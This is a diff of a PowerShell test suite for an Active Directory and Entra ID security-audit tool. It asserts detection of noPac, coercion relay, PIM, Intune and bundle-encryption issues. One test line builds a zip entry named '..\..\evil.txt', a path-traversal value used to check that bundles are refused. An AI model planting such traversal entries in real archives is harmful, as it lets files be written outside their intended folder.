+Assert-True ($nbt.Count -eq 1 -and $nbt[0].Object -eq 'dc02.moosebank.local' -and $nbt[0].Detail -match 'vmxnet3 Ethernet Adapter \(default: from DHCP\)' -and $nbt[0].Detail -notmatch 'Backup NIC') "live: NetBIOS on DC02's main adapter only (got $($nbt.Detail))"
+Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -in 'nbtns_enabled_dc', 'webclient_on_dc', 'dc_low_disk' }).Count -eq 0) 'live: unreachable RODC alone does not make the DC state checks partial'
+$snapPart = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$p1 = @($snapPart.health.dcState | Where-Object { $_.dc -eq 'dc01.moosebank.local' })[0]; $p1.error = 'Access is denied.'
+$rPart = Invoke-Analysis $snapPart
+$partNE = @($rPart.NotEvaluated | Where-Object { $_.Type -in 'nbtns_enabled_dc', 'webclient_on_dc', 'dc_low_disk', 'dc_service_stopped' })
+Assert-True ($partNE.Count -eq 4 -and @($partNE | Where-Object { $_.Reason -match 'only partly evaluated: could not read dc01\.moosebank\.local \(Access is denied\.\)' }).Count -eq 4) 'live: a DC refusing CIM marks the live checks as only partly evaluated, naming the DC'
+Assert-True ((Has $rPart 'nbtns_enabled_dc' 'dc02.moosebank.local') -and (Has $rPart 'webclient_on_dc' 'dc02.moosebank.local')) 'live: the DCs that were read still produce their findings'
+$snapNbOld = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+foreach ($ns in @($snapNbOld.health.dcState)) { $ns.PSObject.Properties.Remove('netbiosAdapters') }
+$rNbOld = Invoke-Analysis $snapNbOld
+Assert-True (-not (Has $rNbOld 'nbtns_enabled_dc' 'dc02.moosebank.local') -and @($rNbOld.NotEvaluated | Where-Object { $_.Type -eq 'nbtns_enabled_dc' }).Count -eq 1) 'live: NetBIOS not evaluated on an older snapshot'
+$np = @($r.Findings | Where-Object { $_.Type -eq 'nopac_unpatched_dc' })
+Assert-True ($np.Count -eq 1 -and $np[0].Object -eq 'dc02.moosebank.local' -and $np[0].Severity -eq 'Critical' -and $np[0].Detail -match 'Build 17763\.2237, fixed from 17763\.2300') "live: noPac on DC02 (2019 before the November 2021 update), Critical with MAQ 10 (got $($np.Detail))"
+Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -eq 'nopac_unpatched_dc' }).Count -eq 0) 'live: noPac fully evaluated when every DC read has a known build'
+$snapNp = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$snapNp.domain.machineAccountQuota = 0
+$n1 = @($snapNp.health.dcState | Where-Object { $_.dc -eq 'dc01.moosebank.local' })[0]; $n1.osBuild = '9600'; $n1.osUbr = $null
+$rNp = Invoke-Analysis $snapNp
+Assert-True ((Has $rNp 'nopac_unpatched_dc' 'dc02.moosebank.local' 'High') -and -not (Has $rNp 'nopac_unpatched_dc' 'dc01.moosebank.local')) 'live: noPac is High with MAQ 0; a 2012 R2 DC is not guessed'
+Assert-True (@($rNp.NotEvaluated | Where-Object { $_.Type -eq 'nopac_unpatched_dc' -and $_.Reason -match 'could not be verified on dc01\.moosebank\.local \(build 9600, no update revision\)' }).Count -eq 1) 'live: noPac names the DC whose patch level is unknown'
+foreach ($ns in @($snapNp.health.dcState)) { $ns.PSObject.Properties.Remove('osBuild'); $ns.PSObject.Properties.Remove('osUbr') }
+$rNpOld = Invoke-Analysis $snapNp
+Assert-True (-not (Has $rNpOld 'nopac_unpatched_dc' 'dc02.moosebank.local') -and @($rNpOld.NotEvaluated | Where-Object { $_.Type -eq 'nopac_unpatched_dc' }).Count -eq 1) 'live: noPac not evaluated on an older snapshot'
+$co = @($r.Findings | Where-Object { $_.Type -eq 'coercion_unfiltered_dc' })
+Assert-True ($co.Count -eq 1 -and $co[0].Object -eq 'dc02.moosebank.local' -and $co[0].Severity -eq 'High' -and $co[0].Detail -match 'MS-EFSR' -and $co[0].Detail -match 'MS-DFSNM' -and $co[0].Detail -match 'no RPC filter' -and $co[0].Detail -match 'LDAP signing not required' -and $co[0].Detail -match 'ESC8') "live: coercion open on DC02 with relay targets, DC01 filtered (got $($co.Detail))"
+$snapCo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
+$c2 = @($snapCo.health.dcState | Where-Object { $_.dc -eq 'dc02.moosebank.local' })[0]; $c2.rpcFilterInterfaces = @('MS-EFSR')
+$c1 = @($snapCo.health.dcState | Where-Object { $_.dc -eq 'dc01.moosebank.local' })[0]; $c1.rpcFilterInterfaces = $null
+$snapCo.gpo.collected = $false
+$cr = @($snapCo.adcs.enrollmentServices)[0].caRegistry; $cr.webEnrollment = $false; $cr.interfaceFlags = 0x241
+$rCo = Invoke-Analysis $snapCo
+$co2 = @($rCo.Findings | Where-Object { $_.Type -eq 'coercion_unfiltered_dc' -and $_.Object -eq 'dc02.moosebank.local' })
+$co1 = @($rCo.Findings | Where-Object { $_.Type -eq 'coercion_unfiltered_dc' -and $_.Object -eq 'dc01.moosebank.local' })
+Assert-True ($co2.Count -eq 1 -and $co2[0].Severity -eq 'Medium' -and (($co2[0].Detail -split ';')[0]) -notmatch 'MS-EFSR' -and $co2[0].Detail -match 'RPC filters found for MS-EFSR') 'live: a filtered interface drops out; no relay target gives Medium'
+Assert-True ($co1.Count -eq 1 -and $co1[0].Detail -match 'could not be read') 'live: an unreadable RPC filter store is not taken as filtered'
+foreach ($cs2 in @($snapCo.health.dcState)) { $cs2.PSObject.Properties.Remove('coercionServices') }
+$rCoOld = Invoke-Analysis $snapCo
+Assert-True (@($rCoOld.Findings | Where-Object { $_.Type -eq 'coercion_unfiltered_dc' }).Count -eq 0 -and @($rCoOld.NotEvaluated | Where-Object { $_.Type -eq 'coercion_unfiltered_dc' }).Count -eq 1) 'live: coercion not evaluated on an older snapshot'
 Assert-True (Has $r 'dangerous_privilege_right' 'Debug programs') 'gpo: SeDebug granted to non-Tier0'
 Assert-True (-not (Has $r 'smb_signing_not_required')) 'gpo: SMB signing correctly required -> no finding'
 Assert-True (-not (Has $r 'lm_hash_stored')) 'gpo: NoLMHash set via root GPO -> no finding'
@@ -617,6 +796,67 @@ $ecfg = @{ MaxGlobalAdmins = 4; StaleGuestDays = 90; SecretExpiringDays = 30; Ma
 $ef = @(Invoke-EntraChecks -Snapshot $entra -Config $ecfg)
 function EHas { param([string]$Type, [string]$Object = '', [string]$Sev = '') @($ef | Where-Object { $_.Type -eq $Type -and (-not $Object -or $_.Object -eq $Object) -and (-not $Sev -or $_.Severity -eq $Sev) }).Count -gt 0 }
 Assert-True (EHas 'entra_security_defaults_off') 'entra: security defaults off + no CA MFA'
+$eSev = @{}; foreach ($x in $ef) { $eSev[$x.Severity] = 1 + [int]$eSev[$x.Severity] }
+Assert-True ($ef.Count -eq 89 -and $eSev['Critical'] -eq 4 -and $eSev['High'] -eq 19 -and $eSev['Medium'] -eq 27 -and $eSev['Low'] -eq 39) "entra total findings: expected 89 (4/19/27/39), got $($ef.Count) ($($eSev['Critical'])/$($eSev['High'])/$($eSev['Medium'])/$($eSev['Low']))"
+# EntraFalcon gaps: groups behind CA exclusions and admin roles, Entra Connect app, look-alike names.
+$eg = @($ef | Where-Object { $_.Type -eq 'entra_ca_excluded_group_weak' })
+Assert-True ($eg.Count -eq 1 -and $eg[0].Object -eq 'Project Elk team' -and $eg[0].Detail -match 'public Microsoft 365 group' -and $eg[0].Detail -match 'non-admin user12@') "entra: public, user-owned group excluded from CA flagged; the admin-owned emergency group is not (got $($eg.Object -join ', '))"
+$epg = @($ef | Where-Object { $_.Type -eq 'entra_privileged_group_owner' })
+$epgT2 = @($epg | Where-Object { $_.Object -eq 'Tier 2 security operators' })
+$epgPim = @($epg | Where-Object { $_.Object -eq 'PIM - Global Admins' })
+Assert-True ($epg.Count -eq 2 -and $epgT2.Count -eq 1 -and $epgT2[0].Detail -match 'Security Administrator' -and $epgT2[0].Detail -match 'user13@' -and $epgT2[0].Detail -notmatch 'alice') "entra: role-holding group owned by a non-admin flagged, the admin owner not listed (got $($epg.Object -join ', '))"
+Assert-True ($epgPim.Count -eq 1 -and $epgPim[0].Detail -match 'eligible owner non-admin user14@' -and $epgPim[0].Detail -notmatch 'alice|user1@') 'entra: PIM for Groups eligible owner of a Global Admin group flagged; an eligible member is not an owner'
+# Schema 7: PIM rules, scoped admins, service principal owners, inactive apps, instance lock, access packages.
+$epr = @($ef | Where-Object { $_.Type -eq 'entra_pim_role_settings_weak' })
+Assert-True ($epr.Count -eq 1 -and $epr[0].Severity -eq 'Medium' -and $epr[0].Detail -match 'without MFA or authentication context: Privileged Role Administrator\.' -and $epr[0].Detail -match 'Privileged Role Administrator \(10 h\)' -and $epr[0].Detail -match 'active assignments can be permanent: Global Administrator' -and $epr[0].Detail -notmatch 'Security Administrator') "entra: weak PIM role settings, one finding listing roles per issue (got $($epr.Detail))"
+Assert-True (EHas 'entra_privileged_app_sp_owner' 'Backup Automation' 'High') 'entra: managed identity owning a privileged app'
+Assert-True ((EHas 'entra_privileged_app_inactive' 'Backup Automation' 'Medium') -and -not (EHas 'entra_privileged_app_inactive' 'func-payroll-mi')) 'entra: privileged app unused for 400 days flagged, the busy managed identity is not'
+Assert-True ((EHas 'entra_app_instance_lock_off' 'Legacy Sync App' 'Low') -and @($ef | Where-Object { $_.Type -eq 'entra_app_instance_lock_off' }).Count -eq 1) 'entra: multi-tenant app with credentials and no instance lock; single-tenant apps ignored'
+Assert-True (@($ef | Where-Object { $_.Type -eq 'entra_access_package_grants_admin' -and $_.Object -eq 'IT on-call' -and $_.Detail -match 'Tier 2 security operators' }).Count -eq 1 -and -not (EHas 'entra_access_package_grants_admin' 'Finance share')) 'entra: self-service access package granting a role-holding group; a package needing approval is not flagged'
+Assert-True (-not (EHas 'entra_scoped_admin_outside_ca')) 'entra: scoped admins not flagged when no policy relies on role targeting'
+$esa = @($ef | Where-Object { $_.Type -eq 'entra_app_scoped_admin_privileged' })
+Assert-True ($esa.Count -eq 1 -and $esa[0].Object -eq 'Backup Automation' -and $esa[0].Detail -match 'user13@moosebank\.onmicrosoft\.com \(Cloud Application Administrator\)' -and $esa[0].Detail -notmatch 'user15') "entra: app admin scoped to the registration of a privileged app flagged, one scoped to a harmless app not (got $($esa.Detail))"
+# Schema 8: Intune roles that can push code, given through a group that is not role-assignable.
+$eir = @($ef | Where-Object { $_.Type -eq 'entra_intune_role_weak_group' })
+Assert-True ($eir.Count -eq 2 -and (EHas 'entra_intune_role_weak_group' 'Policy and Profile Manager: Endpoint team' 'High') -and (EHas 'entra_intune_role_weak_group' 'Workstation scripts: Endpoint team') -and @($eir | Where-Object { $_.Detail -match 'DeviceManagementScripts_Assign' }).Count -eq 1) "entra: powerful Intune roles (built-in and custom) on a plain group flagged; a role-assignable group and Read Only Operator are not (got $($eir.Object -join ', '))"
+$entraS8 = Import-ADSnapshot (Join-Path $tmp 'entra.json'); $entraS8.meta.schemaVersion = 7; $entraS8.PSObject.Properties.Remove('intuneRoles')
+$efS8 = @(Invoke-EntraChecks -Snapshot $entraS8 -Config $ecfg); $neS8 = @(Get-EntraNotEvaluated -Snapshot $entraS8 | ForEach-Object { $_.Type })
+Assert-True (@($efS8 | Where-Object { $_.Type -eq 'entra_intune_role_weak_group' }).Count -eq 0 -and ($neS8 -contains 'entra_intune_role_weak_group') -and ($neS8 -notcontains 'entra_access_package_grants_admin')) 'entra: schema 7 snapshot: the Intune check is not evaluated and silent, the schema 7 checks still run'
+$entraIF = Import-ADSnapshot (Join-Path $tmp 'entra.json'); $entraIF.intuneRoles = $null
+$entraIF.meta.collectionErrors = @([PSCustomObject]@{ section = 'intuneRoles'; message = 'Forbidden (synthetic: no Intune licence)' })
+$efIF = @(Invoke-EntraChecks -Snapshot $entraIF -Config $ecfg); $neIF = @(Get-EntraNotEvaluated -Snapshot $entraIF | ForEach-Object { $_.Type })
+Assert-True (@($efIF | Where-Object { $_.Type -eq 'entra_intune_role_weak_group' }).Count -eq 0 -and ($neIF -contains 'entra_intune_role_weak_group')) 'entra: Intune roles not readable (no licence): not evaluated, no finding'
+Assert-True (@($efIF | Where-Object { $_.Type -eq 'entra_intune_no_multi_admin_approval' }).Count -eq 0 -and ($neIF -contains 'entra_intune_no_multi_admin_approval')) 'entra: no Intune licence: Multi Admin Approval not evaluated, no finding'
+# Schema 9: Multi Admin Approval only for apps leaves wipes, scripts and roles open.
+$ema = @($ef | Where-Object { $_.Type -eq 'entra_intune_no_multi_admin_approval' })
+Assert-True ($ema.Count -eq 1 -and $ema[0].Object -eq 'Intune' -and $ema[0].Severity -eq 'High' -and $ema[0].Detail -eq 'No Multi Admin Approval for: device wipe, scripts, Intune roles. Policies exist for: app.') "entra: Multi Admin Approval missing for wipes and scripts (got $($ema.Detail))"
+$entraMa = Import-ADSnapshot (Join-Path $tmp 'entra.json')
+$entraMa.intuneApprovalPolicies = @('deviceWipe', 'script') | ForEach-Object { [PSCustomObject]@{ id = $_; policyType = $_; policyPlatform = 'notApplicable'; approverGroupCount = 1 } }
+Assert-True (@(Invoke-EntraChecks -Snapshot $entraMa -Config $ecfg | Where-Object { $_.Type -eq 'entra_intune_no_multi_admin_approval' }).Count -eq 0) 'entra: wipes and scripts behind Multi Admin Approval: no finding'
+$entraS9 = Import-ADSnapshot (Join-Path $tmp 'entra.json'); $entraS9.meta.schemaVersion = 8; $entraS9.PSObject.Properties.Remove('intuneApprovalPolicies')
+$efS9 = @(Invoke-EntraChecks -Snapshot $entraS9 -Config $ecfg); $neS9 = @(Get-EntraNotEvaluated -Snapshot $entraS9 | ForEach-Object { $_.Type })
+Assert-True (@($efS9 | Where-Object { $_.Type -eq 'entra_intune_no_multi_admin_approval' }).Count -eq 0 -and ($neS9 -contains 'entra_intune_no_multi_admin_approval') -and ($neS9 -notcontains 'entra_intune_role_weak_group')) 'entra: schema 8 snapshot: Multi Admin Approval not evaluated and silent, the Intune role check still runs'
+$entraS = Import-ADSnapshot (Join-Path $tmp 'entra.json')
+$entraS.conditionalAccess = @($entraS.conditionalAccess) + @([PSCustomObject]@{ id = 'ca-admins'; displayName = 'MFA for admin roles'; state = 'enabled'; includeUsers = @(); excludeUsers = @(); excludeGroups = @(); includeGroups = @(); includeRoles = @('62e90394-69f5-4237-9190-012177145e10', '9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3'); includeApplications = @('All'); includeUserActions = @(); includeLocations = @(); excludeLocations = @(); clientAppTypes = @('all'); userRiskLevels = @(); signInRiskLevels = @(); transferMethods = ''; grantControls = @('mfa'); authStrengthId = ''; signInFrequency = $false; signInFrequencyInterval = ''; persistentBrowser = ''; tokenProtection = $false; includeServicePrincipals = @() })
+$efS = @(Invoke-EntraChecks -Snapshot $entraS -Config $ecfg)
+Assert-True (@($efS | Where-Object { $_.Type -eq 'entra_scoped_admin_outside_ca' -and $_.Detail -match 'dave\.appadmin@moosebank\.onmicrosoft\.com \(Application Administrator\)' -and $_.Detail -notmatch 'alice' }).Count -eq 1) 'entra: AU-scoped admin outside a role-targeted MFA policy flagged; tenant-wide assignments are not'
+$entraS7 = Import-ADSnapshot (Join-Path $tmp 'entra.json'); $entraS7.meta.schemaVersion = 6
+foreach ($pp in 'pimRules', 'roleAssignments', 'spSignIns', 'accessPackageGrants') { $entraS7.PSObject.Properties.Remove($pp) }
+$efS7 = @(Invoke-EntraChecks -Snapshot $entraS7 -Config $ecfg); $neS7 = @(Get-EntraNotEvaluated -Snapshot $entraS7 | ForEach-Object { $_.Type })
+$s7 = 'entra_pim_role_settings_weak', 'entra_scoped_admin_outside_ca', 'entra_privileged_app_sp_owner', 'entra_privileged_app_inactive', 'entra_app_instance_lock_off', 'entra_access_package_grants_admin'
+Assert-True (@($efS7 | Where-Object { $s7 -contains $_.Type }).Count -eq 0 -and @($s7 | Where-Object { $neS7 -notcontains $_ }).Count -eq 0 -and ($neS7 -contains 'entra_privileged_group_owner') -and (@($efS7 | Where-Object { $_.Type -eq 'entra_privileged_group_owner' }).Count -ge 1)) 'entra: schema 6 snapshot: the schema 7 checks are not evaluated and silent; the group owner check is partial (no PIM for Groups) but still reports direct owners'
+Assert-True (EHas 'entra_connect_app_extra_credentials' 'ConnectSyncProvisioning_SYNC01_8f3a2c' 'High') 'entra: Entra Connect app with a second certificate'
+Assert-True (@($ef | Where-Object { $_.Type -eq 'entra_sp_lookalike_name' }).Count -eq 1 -and -not (EHas 'entra_sp_lookalike_name' 'Benign SP')) 'entra: look-alike service principal name (Cyrillic o), plain names untouched'
+$entraG = Import-ADSnapshot (Join-Path $tmp 'entra.json')
+$gElk = @($entraG.groups | Where-Object { $_.displayName -eq 'Project Elk team' })[0]; $gElk.visibility = 'Private'; $gElk.dynamic = $true; $gElk.membershipRule = '(user.otherMails -contains "@moosebank")'
+$gElk.ownerTypes = [PSCustomObject]@{ '00000001-0000-0000-0000-000000000000' = 'user' }
+$gT2 = @($entraG.groups | Where-Object { $_.displayName -eq 'Tier 2 security operators' })[0]; $gT2.ownerTypes = [PSCustomObject]@{ '00000004-0000-0000-0000-000000000000' = 'user'; '00000400-0000-0000-0000-000000000000' = 'servicePrincipal' }
+$efG = @(Invoke-EntraChecks -Snapshot $entraG -Config $ecfg)
+Assert-True (@($efG | Where-Object { $_.Type -eq 'entra_ca_excluded_group_weak' -and $_.Detail -match 'dynamic rule .*otherMails' -and $_.Detail -notmatch 'owners' }).Count -eq 1) 'entra: dynamic exclusion group on a user-influenced attribute flagged even with an admin owner'
+Assert-True (@($efG | Where-Object { $_.Type -eq 'entra_privileged_group_owner' -and $_.Detail -match 'guest ext\.partner' -and $_.Detail -match 'service principal Backup Automation' }).Count -eq 1) 'entra: guest and service principal owners of a role-holding group flagged'
+$entraG5 = Import-ADSnapshot (Join-Path $tmp 'entra.json'); $entraG5.meta.schemaVersion = 5; $entraG5.PSObject.Properties.Remove('groups')
+$efG5 = @(Invoke-EntraChecks -Snapshot $entraG5 -Config $ecfg); $neG5 = @(Get-EntraNotEvaluated -Snapshot $entraG5 | ForEach-Object { $_.Type })
+Assert-True (@($efG5 | Where-Object { $_.Type -in 'entra_ca_excluded_group_weak', 'entra_privileged_group_owner' }).Count -eq 0 -and ($neG5 -contains 'entra_ca_excluded_group_weak') -and ($neG5 -contains 'entra_privileged_group_owner') -and ($neG5 -notcontains 'entra_connect_app_extra_credentials')) 'entra: schema 5 snapshot: group checks not evaluated and silent, the others still run'
 # Conditional Access / security defaults not collected (e.g. a personal account): no "no policy does X" finding may appear.
 $entraNoCa = Import-ADSnapshot (Join-Path $tmp 'entra.json')
 $entraNoCa.conditionalAccess = $null; $entraNoCa.securityDefaults = $null
@@ -817,6 +1057,8 @@ Assert-True ((Test-Path $aiDry) -and [System.IO.File]::ReadAllText($aiDry) -eq $
 $entraHtml = Join-Path $tmp 'entratest.html'
 & (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'entra.json') -OutHtml $entraHtml -SendToAI -ApiKey '' 6>&1 2>&1 | Out-Null
 Assert-True (Test-Path (Join-Path $tmp 'entratest_ai_prompt.txt')) 'entra: the prompt is saved next to the report too'
+$entraPrompt = if (Test-Path (Join-Path $tmp 'entratest_ai_prompt.txt')) { [System.IO.File]::ReadAllText((Join-Path $tmp 'entratest_ai_prompt.txt')) } else { '' }
+Assert-True ($entraPrompt -match 'GROUP-\d' -and $entraPrompt -notmatch 'Project Elk|Tier 2 security|Teams Connector|ConnectSyncProvisioning') 'entra: group, app and look-alike service principal names never reach the prompt'
 
 # ------------------------------------------------------------ AD collector: GPO scripts, tasks, groups
 # The parser runs on real-format files in a temp folder (no SYSVOL needed).
@@ -851,6 +1093,26 @@ Assert-True (@($px | Where-Object { $_.kind -eq "scheduled task 'Inventory'" }).
 $pairs = @($pg | ForEach-Object { "$($_.group)<-$($_.member)" })
 Assert-True ($pairs -contains 'S-1-5-32-544<-S-1-5-21-1-2-3-513' -and $pairs -contains 'S-1-5-32-555<-S-1-5-11' -and $pairs -contains 'S-1-5-32-544<-S-1-5-21-1-2-3-1106' -and $pairs.Count -eq 3) "GPO parser: Groups.xml ADD only, Restricted Groups Members and Memberof (got $($pairs -join ' | '))"
 Remove-Item Function:\Read-GpoExtras, Function:\ConvertFrom-IniText
+# registry.pol: a DWORD and a string, read with the USER hive prefix (User\registry.pol).
+. ([scriptblock]::Create($cAst.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'ConvertFrom-RegistryPol' }, $true).Extent.Text))
+$polU = [System.Text.Encoding]::Unicode
+$polEntry = { param($k, $v, [int]$type, [byte[]]$data)
+    [byte[]](@($polU.GetBytes("[$k`0;$v`0;")) + [BitConverter]::GetBytes($type) + $polU.GetBytes(';') + [BitConverter]::GetBytes([int]$data.Length) + $polU.GetBytes(';') + $data + $polU.GetBytes(']')) }
+$polBytes = [byte[]](@(0x50, 0x52, 0x65, 0x67, 1, 0, 0, 0) +
+    (& $polEntry 'Software\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated' 4 ([BitConverter]::GetBytes([int]1))) +
+    (& $polEntry 'Software\Policies\Microsoft\Windows\WindowsUpdate' 'WUServer' 1 ($polU.GetBytes("http://wsus01:8530`0"))))
+$polFile = Join-Path $tmp 'user_registry.pol'; [System.IO.File]::WriteAllBytes($polFile, $polBytes)
+$polRead = ConvertFrom-RegistryPol $polFile 'USER'
+Assert-True ($polRead['USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated'] -eq '4,1' -and $polRead['USER\Software\Policies\Microsoft\Windows\WindowsUpdate\WUServer'] -eq '1,http://wsus01:8530' -and @($polRead.Keys).Count -eq 2) "registry.pol parser: USER hive, DWORD and string (got $(@($polRead.Keys | ForEach-Object { "$_=$($polRead[$_])" }) -join ' | '))"
+Assert-True (@((ConvertFrom-RegistryPol $polFile).Keys)[0] -like 'MACHINE\*') 'registry.pol parser: MACHINE is still the default hive'
+Remove-Item Function:\ConvertFrom-RegistryPol
+# altSecurityIdentities: mapping types only, never the values.
+. ([scriptblock]::Create($cAst.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'ConvertTo-AltSecIdTypes' }, $true).Extent.Text))
+$asTypes = ConvertTo-AltSecIdTypes @('X509:<I>DC=local,DC=corp,CN=CA<SR>1200000000AC11000000002B', 'X509:<SKI>123456789abcdef', 'X509:<SHA1-PUKEY>cdbad1f3', 'X509:<I>DC=local,CN=CA<S>CN=alice', 'X509:<S>CN=alice', 'X509:<RFC822>alice@corp.local', 'Kerberos:alice@CORP.LOCAL')
+Assert-True (($asTypes -join ',') -eq 'IssuerSerial,SKI,SHA1PublicKey,IssuerSubject,SubjectOnly,RFC822') "altSecurityIdentities parser: types only, Kerberos mappings skipped (got $($asTypes -join ','))"
+$asEmpty = [ordered]@{ t = ConvertTo-AltSecIdTypes $null }
+Assert-True (($asEmpty | ConvertTo-Json -Compress) -eq '{"t":[]}') 'altSecurityIdentities parser: no mapping serializes as [] (not {} on 5.1)'
+Remove-Item Function:\ConvertTo-AltSecIdTypes
 
 # ------------------------------------------------------------ Entra collector: Get-Graph
 # Pulled out of the collector and run against a fake Graph: no tenant needed.
@@ -877,7 +1139,7 @@ $tempBefore = @(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Di
 $bz = New-IDWolfBundle -Snapshot (Join-Path $tmp 'demo.json') -PasswordQuality (Join-Path $root 'examples\passwordquality.example.json') -OutFile (Join-Path $tmp 'bundle.zip')
 $bzCsv = Join-Path $tmp 'bundle.csv'
 & (Join-Path $root 'IDWolf.ps1') -Snapshot $bz -OutHtml (Join-Path $tmp 'bundle.html') -OutCsv $bzCsv -SkipLLM 6>&1 2>&1 | Out-Null
-Assert-True ((Test-Path $bzCsv) -and @(Import-Csv $bzCsv).Count -eq 173) "zip with snapshot + password quality analyzes like the two files (173 findings, got $(if (Test-Path $bzCsv) { @(Import-Csv $bzCsv).Count }))"
+Assert-True ((Test-Path $bzCsv) -and @(Import-Csv $bzCsv).Count -eq 201) "zip with snapshot + password quality analyzes like the two files (201 findings, got $(if (Test-Path $bzCsv) { @(Import-Csv $bzCsv).Count }))"
 $tempAfter = @(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count
 Assert-True ($tempAfter -eq $tempBefore) 'extracted bundle removed from TEMP after the analysis'
 # A file changed inside the zip no longer matches the manifest.
@@ -894,6 +1156,25 @@ $sw = New-Object System.IO.StreamWriter($za.CreateEntry('..\..\evil.txt').Open()
 $noMsg = ''; try { Expand-IDWolfBundle -Path $notOurs | Out-Null } catch { $noMsg = $_.Exception.Message }
 Assert-True ($noMsg -match 'not an IDWolf bundle' -and -not (Test-Path (Join-Path $tmp 'evil.txt'))) 'zip without a snapshot refused, its entries never extracted'
 Assert-True (@(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count -eq $tempBefore) 'refused bundles leave nothing in TEMP'
+# Encrypted bundle: AES-256 + HMAC container, opened only with the right password.
+$encPw = ConvertTo-SecureString 'correct horse battery staple' -AsPlainText -Force
+$encBz = New-IDWolfBundle -Snapshot (Join-Path $tmp 'demo.json') -PasswordQuality (Join-Path $root 'examples\passwordquality.example.json') -OutFile (Join-Path $tmp 'bundle.idwolf') -Password $encPw
+$encHead = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($encBz), 0, 10)
+$encZipMsg = ''; try { ([System.IO.Compression.ZipFile]::OpenRead($encBz)).Dispose() } catch { $encZipMsg = 'not a zip' }
+$encRaw = [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($encBz))
+Assert-True ($encHead -eq 'IDWOLFENC1' -and $encZipMsg -and $encRaw -notmatch 'moosebank|snapshot\.json') 'encrypted bundle: IDWolf header, not readable as a zip, no plain names inside'
+$encCsv = Join-Path $tmp 'bundle_enc.csv'
+& (Join-Path $root 'IDWolf.ps1') -Snapshot $encBz -BundlePassword $encPw -OutHtml (Join-Path $tmp 'bundle_enc.html') -OutCsv $encCsv -SkipLLM 6>&1 2>&1 | Out-Null
+Assert-True ((Test-Path $encCsv) -and @(Import-Csv $encCsv).Count -eq 201) "encrypted bundle analyzes like the plain one with the right password (got $(if (Test-Path $encCsv) { @(Import-Csv $encCsv).Count }))"
+$wrongMsg = ''; try { Expand-IDWolfBundle -Path $encBz -Password (ConvertTo-SecureString 'wrong password here' -AsPlainText -Force) | Out-Null } catch { $wrongMsg = $_.Exception.Message }
+$tamper2 = Join-Path $tmp 'tampered.idwolf'; $tb = [System.IO.File]::ReadAllBytes($encBz); $tb[100] = $tb[100] -bxor 1; [System.IO.File]::WriteAllBytes($tamper2, $tb)
+$tamperMsg = ''; try { Expand-IDWolfBundle -Path $tamper2 -Password $encPw | Out-Null } catch { $tamperMsg = $_.Exception.Message }
+$noPwMsg = ''; try { Expand-IDWolfBundle -Path $encBz | Out-Null } catch { $noPwMsg = $_.Exception.Message }
+Assert-True ($wrongMsg -match 'Wrong password' -and $tamperMsg -match 'Wrong password, or the encrypted bundle was changed' -and $noPwMsg -match 'a password is needed') "encrypted bundle: wrong password, a flipped byte and a missing password are refused ($wrongMsg | $tamperMsg | $noPwMsg)"
+Assert-True (@(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count -eq $tempBefore) 'encrypted bundles leave nothing in TEMP, refused or not'
+$plainBz2 = New-IDWolfBundle -Snapshot (Join-Path $tmp 'demo.json') -OutFile (Join-Path $tmp 'bundle_plain.zip')
+$pb = Expand-IDWolfBundle -Path $plainBz2; $pbOk = [bool]$pb.Snapshot; Remove-IDWolfBundle $pb
+Assert-True ($pbOk -and -not (Test-IDWolfEncryptedBundle $plainBz2)) 'a bundle without a password is still a plain zip that opens without one'
 
 # ------------------------------------------------------------ SIEM JSON Lines
 Write-Host "[siem]"
@@ -902,8 +1183,8 @@ $jl = Join-Path $tmp 'demo.jsonl'
 $jlRows = @([System.IO.File]::ReadAllLines($jl) | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
 $jlFind = @($jlRows | Where-Object { $_.event_type -eq 'finding' })
 $jlSum = @($jlRows | Where-Object { $_.event_type -eq 'summary' })
-Assert-True ($jlFind.Count -eq 165 -and $jlSum.Count -eq 1) "jsonl: 165 findings + 1 summary (got $($jlFind.Count) + $($jlSum.Count))"
-Assert-True ($jlSum[0].critical -eq 20 -and $jlSum[0].findings -eq 165 -and $jlSum[0].score -ge 0 -and $jlSum[0].domain -eq 'moosebank.local') 'jsonl summary: counts, score, domain'
+Assert-True ($jlFind.Count -eq 193 -and $jlSum.Count -eq 1) "jsonl: 193 findings + 1 summary (got $($jlFind.Count) + $($jlSum.Count))"
+Assert-True ($jlSum[0].critical -eq 25 -and $jlSum[0].findings -eq 193 -and $jlSum[0].score -ge 0 -and $jlSum[0].domain -eq 'moosebank.local') 'jsonl summary: counts, score, domain'
 Assert-True (@($jlFind | Where-Object { $_.finding_id -notmatch '^[0-9a-f]{16}$' -or $_.severity_score -lt 1 }).Count -eq 0) 'jsonl: every finding has a finding_id and a severity_score'
 Assert-True (@($jlFind | ForEach-Object { $_.finding_id } | Select-Object -Unique).Count -eq $jlFind.Count) 'jsonl: finding_id unique within a run'
 Assert-True ((Get-FindingId 'x_check' 'Bob') -eq (Get-FindingId 'X_CHECK' 'bob')) 'finding_id ignores case, so it survives renames in case only'
@@ -960,10 +1241,10 @@ Assert-True ($LASTEXITCODE -eq 0) "safety review passes on the shipped code: $($
 # The review must catch code that writes to AD, downloads, or hides what it runs.
